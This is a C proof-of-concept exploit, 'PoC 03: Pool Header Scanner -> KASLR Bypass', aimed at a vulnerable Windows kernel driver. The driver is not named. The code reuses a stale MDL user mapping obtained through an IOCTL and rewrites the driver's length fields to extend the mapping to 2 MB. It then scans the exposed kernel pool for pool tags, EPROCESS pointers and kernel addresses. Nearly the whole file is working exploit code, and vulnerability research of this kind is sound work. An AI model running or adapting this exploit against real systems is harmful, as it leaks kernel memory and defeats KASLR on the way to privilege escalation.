/*
 * 03_extend_mdl.c — Pool Header Scanner + KASLR Bypass (CWE‑20)
 */

#include "device.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>

#define EXTENDED_LENGTH  0x200000   /* 2 MB — safe on most VMs */


/*
 * isPrintableTag — check if a 4‑byte value looks like a pool tag.
 *
 * Pool tags are human‑readable 4‑character ASCII identifiers,
 * e.g. 'ldmM', 'Even', 'DvSM'.  A tag is considered valid if all
 * four bytes are printable ASCII (0x20 … 0x7E).
 */
static int isPrintableTag(DWORD tag) {
    BYTE *chars = (BYTE *)&tag;
    for (int i = 0; i < 4; i++) {
        if (chars[i] < 0x20 || chars[i] > 0x7E) return 0;
    }
    return 1;
}


/*
 * isKernelAddress — check if a 64‑bit value is in kernel space.
 *
 * On Windows x64, kernel addresses start at 0xFFFF800000000000.
 * Excludes the sentinel value 0xFFFFFFFFFFFFFFFF.
 */
static int isKernelAddress(ULONGLONG value) {
    return (value >> 48) == 0xFFFF
        && value != 0xFFFFFFFFFFFFFFFFULL
        && value != 0;
}


/*
 * expandMdlLength — change the MDL length fields in the stale buffer.
 *
 * The driver reads buf[0x28] and buf[0x2C] to compute:
 *   MDL length = buf[0x2C] + 0xF0 + buf[0x28]
 *
 * We split the desired length into two parts to reach the target.
 */
static void expandMdlLength(BYTE *staleBuffer, DWORD newLength) {
    DWORD value28 = newLength / 3;
    DWORD value2C = newLength - value28 - 0xF0;

    printf("[modify] buf[0x28] = %u, buf[0x2C] = %u -> MDL = %u bytes\n",
           value28, value2C, newLength);

    *(volatile DWORD *)(staleBuffer + 0x28) = value28;
    *(volatile DWORD *)(staleBuffer + 0x2C) = value2C;
}


/*
 * scanPoolHeaders — walk the mapped region looking for pool tags.
 *
 * Windows pool header layout (16 bytes):
 *   +0x00  PreviousSize (byte)  — block size of previous chunk / 16
 *   +0x01  PoolIndex    (byte)  — pool context index
 *   +0x02  BlockSize    (byte)  — block size in 16‑byte units
 *   +0x03  PoolType     (byte)  — type flags (0x02=NonPaged, 0x04=QUOTA)
 *   +0x04  PoolTag      (dword) — 4‑byte printable tag (e.g. 'ldmM')
 *   +0x08  ProcessBilled (qword) — EPROCESS pointer (if QUOTA bit set)
 *
 * Strategy:
 *   Step 16 bytes at a time (pool header alignment).
 *   At each position, check if bytes at +4 form a printable tag.
 *   If yes, read BlockSize (byte at +2), compute chunk size,
 *   and scan the chunk body for kernel addresses.
 */
static int scanPoolHeaders(BYTE *region, DWORD mapLength) {
    printf("[scan] walking pool tags every 16 bytes...\n\n");

    int tagCount    = 0;
    int eprocCount  = 0;

    for (DWORD offset = 0; offset < mapLength - 16; offset += 16) {

        // Check page every 4 KB — avoid faults on unmapped pages
        if ((offset & 0xFFF) == 0) {
            MEMORY_BASIC_INFORMATION memInfo;
            if (!VirtualQuery(region + offset, &memInfo, sizeof(memInfo))
                || memInfo.State != MEM_COMMIT
                || (memInfo.Protect & (PAGE_NOACCESS | PAGE_GUARD))) {
                printf("[scan] end at +0x%05X\n", offset);
                break;
            }
        }

        BYTE  *chunk     = region + offset;
        DWORD  poolTag   = *(DWORD  *)(chunk + 4);
        int    blockSize = chunk[2];           // single byte — units of 16
        int    poolType  = chunk[3];           // PoolType
        ULONGLONG billed = *(ULONGLONG *)(chunk + 8);

        // Quick filter: tag must be printable ASCII
        if (!isPrintableTag(poolTag)) continue;

        // Compute actual chunk size: (blockSize * 16) — pool header
        // blockSize=0 usually means "big pool" — skip for now
        if (blockSize == 0) continue;

        int chunkBytes = blockSize * 16;

        // Sanity: chunk must fit within our mapping
        if (offset + chunkBytes > mapLength) continue;

        tagCount++;

        if (tagCount <= 80) {
            char tagStr[5] = {0};
            memcpy(tagStr, &poolTag, 4);

            int hasQuota = (poolType & 0x04) != 0;
            int isEproc  = hasQuota && isKernelAddress(billed);

            printf("  [%s] +0x%06X  size=%5d B  type=0x%02X",
                   tagStr, offset, chunkBytes, poolType);

            if (isEproc) {
                printf("  EPROC=0x%016llX", billed);
                eprocCount++;
            }

            printf("\n");

            // Scan chunk body for kernel addresses (starts after header)
            int shown = 0;
            for (int bo = 16; bo < chunkBytes - 7 && shown < 5; bo += 8) {
                ULONGLONG value = *(ULONGLONG *)(chunk + bo);
                if (isKernelAddress(value)) {
                    printf("    +0x%03X: 0x%016llX\n", bo, value);
                    shown++;
                }
            }
        } else {
            // Just count EPROCESS pointers silently
            if ((poolType & 0x04) && isKernelAddress(billed)) eprocCount++;
        }

        if (tagCount >= 500) break;
    }

    printf("\n[scan] %d tags, %d EPROCESS pointers\n", tagCount, eprocCount);
    return eprocCount;
}


int main(int argumentCount, char *argumentValues[]) {
    // Check if user wants extended mode (riskier in VMs)
    int extendMode = 0;
    if (argumentCount > 1 && strcmp(argumentValues[1], "--extend") == 0) {
        extendMode = 1;
    }

    printf("============================================================\n");
    printf(" PoC 03: Pool Header Scanner -> KASLR Bypass\n");
    printf(" Mode: %s\n", extendMode ? "extended (2 MB)" : "default (689 KB)");
    printf("============================================================\n\n");
    Sleep(1000);

    if (extendMode) {
        printf("[warn] Extended mode may BSOD on some VMs.\n");
        printf("[warn] Use '03_extend_mdl.exe' (no flags) for safe mode.\n\n");
        Sleep(2000);
    }

    /* ---- Round 1: create stale mapping ---- */
    HANDLE device1 = openDevice();
    if (device1 == INVALID_HANDLE_VALUE) { printf("[fail] no device\n"); return 1; }

    DWORD bytesReturned; BYTE mapOutput[64]; DWORD mapFlag = 1;
    sendIoctl(device1, IOCTL_MDL_MAP, &mapFlag, sizeof(mapFlag),
              mapOutput, sizeof(mapOutput), &bytesReturned);

    ULONGLONG userVA = *(ULONGLONG *)(mapOutput + 0);
    if (userVA == 0) { printf("[fail] no MDL\n"); CloseHandle(device1); return 2; }

    BYTE *staleBuffer = (BYTE *)(ULONG_PTR)userVA;
    DWORD orig28 = *(DWORD *)(staleBuffer + 0x28);
    DWORD orig2C = *(DWORD *)(staleBuffer + 0x2C);
    DWORD defaultLength = orig2C + 0xF0 + orig28;

    printf("[ok] stale VA: 0x%016llX (%u bytes)\n", userVA, defaultLength);

    CloseHandle(device1);
    Sleep(300);

    /* ---- Optional: extend MDL ---- */
    DWORD scanLength = defaultLength;
    BYTE *scanRegion = NULL;

    if (extendMode) {
        printf("[step] extending MDL to %u bytes...\n", EXTENDED_LENGTH);
        expandMdlLength(staleBuffer, EXTENDED_LENGTH);

        HANDLE device2 = openDevice();
        if (device2 == INVALID_HANDLE_VALUE) { return 3; }

        mapFlag = 1;
        sendIoctl(device2, IOCTL_MDL_MAP, &mapFlag, sizeof(mapFlag),
                  mapOutput, sizeof(mapOutput), &bytesReturned);

        scanRegion = (BYTE *)(ULONG_PTR)*(ULONGLONG *)(mapOutput + 0);
        scanLength = EXTENDED_LENGTH;

        printf("[ok] extended VA: 0x%016llX\n", *(ULONGLONG *)(mapOutput + 0));

        /* Scan */
        printf("\n--- Extended Pool Header Scan (%u bytes) ---\n", scanLength);
        int eprocFound = scanPoolHeaders(scanRegion, scanLength);
        printf("[info] %d EPROCESS pointers\n", eprocFound);

        /* Cleanup */
        DWORD cleanupFlag = 0;
        sendIoctl(device2, IOCTL_MDL_MAP, &cleanupFlag, sizeof(cleanupFlag),
                  mapOutput, sizeof(mapOutput), &bytesReturned);
        CloseHandle(device2);

    } else {
        /* Safe mode: just scan the original 689 KB mapping */
        printf("[info] scanning original %u bytes (safe, no extension)\n",
               defaultLength);

        HANDLE device2 = openDevice();
        if (device2 == INVALID_HANDLE_VALUE) { return 3; }

        mapFlag = 1;
        sendIoctl(device2, IOCTL_MDL_MAP, &mapFlag, sizeof(mapFlag),
                  mapOutput, sizeof(mapOutput), &bytesReturned);

        scanRegion = (BYTE *)(ULONG_PTR)*(ULONGLONG *)(mapOutput + 0);
        scanLength = *(volatile DWORD *)(staleBuffer + 0x2C)
                   + 0xF0
                   + *(volatile DWORD *)(staleBuffer + 0x28);

        printf("[ok] live VA: 0x%016llX, %u bytes\n",
               *(ULONGLONG *)(mapOutput + 0), scanLength);

        printf("\n--- Pool Header Scan (%u bytes) ---\n", scanLength);
        int eprocFound = scanPoolHeaders(scanRegion, scanLength);
        printf("[info] %d EPROCESS pointers\n", eprocFound);

        DWORD cleanupFlag = 0;
        sendIoctl(device2, IOCTL_MDL_MAP, &cleanupFlag, sizeof(cleanupFlag),
                  mapOutput, sizeof(mapOutput), &bytesReturned);
        CloseHandle(device2);
    }

    printf("[ok] done\n");
    return 0;
}

